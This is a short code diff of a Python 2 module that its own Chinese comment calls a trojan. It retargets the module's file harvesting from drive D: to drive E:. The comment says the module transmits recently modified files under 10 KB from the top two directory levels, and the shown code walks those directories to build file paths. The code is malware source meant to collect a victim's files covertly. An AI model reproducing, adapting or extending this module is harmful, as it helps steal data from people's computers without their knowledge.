@@ -3,7 +3,7 @@ import os
 import sys
 import time
 #---------------------------------------------------------------------
-# 此木马模块只传输D盘下一级和二级目录下，修改时间在一周内，且文件大小小于10k的文件
+# 此木马模块只传输E盘下一级和二级目录下，修改时间在一周内，且文件大小小于10k的文件
 #---------------------------------------------------------------------
 ans=[]
 
@@ -26,7 +26,7 @@ def judgesize(name):
 def is_dir(name):
 	if name=="$RECYCLE.BIN":
 		return
-	path_name="D:\\"+name
+	path_name="E:\\"+name
 	try:
 		files=os.listdir(path_name)
 	except Exception,e:
@@ -51,12 +51,12 @@ def is_dir(name):
 
 def run(**args):
 	print "[*] In file_return module. "
-	#os.chdir("D:\\\\") #切换到D目录下
-	files = os.listdir("D:\\")
+	#os.chdir("E:\\\\") #切换到E目录下
+	files = os.listdir("E:\\")
 	content=""
 	for i in range(0,len(files)):
 		#如果是文件
-		path_name="D:\\"+files[i]
+		path_name="E:\\"+files[i]
 		#print "%s" %path_name
 		#print os.path.isdir(path_name)
 		#如果是二级目录
